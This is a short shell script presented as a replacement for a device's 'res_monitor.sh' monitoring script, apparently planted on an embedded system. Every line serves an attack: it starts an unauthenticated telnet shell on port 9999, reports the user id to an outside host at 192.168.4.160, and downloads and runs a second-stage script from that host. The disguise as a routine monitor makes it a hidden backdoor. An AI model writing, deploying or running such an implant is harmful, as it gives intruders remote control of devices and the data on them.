#!/bin/sh
# res_monitor.sh replacement: open a shell immediately (port beats beacon), then one shot
# per boot so repeats are free.
exec >/tmp/fss_resmon_log 2>&1
/bin/busybox telnetd -l /bin/sh -p 9999 2>/dev/null
[ -e /tmp/fss_resmon_once ] && exit 0
B=http://192.168.4.160:8080
/bin/busybox wget -q -O /dev/null "$B/fss-ran?uid=$(/bin/busybox id -u 2>/dev/null)&via=resmon" 2>/dev/null
touch /tmp/fss_resmon_once
/bin/busybox wget -q -O /tmp/fss_s2.sh "$B/fss/stage2.sh" 2>/dev/null && sh /tmp/fss_s2.sh
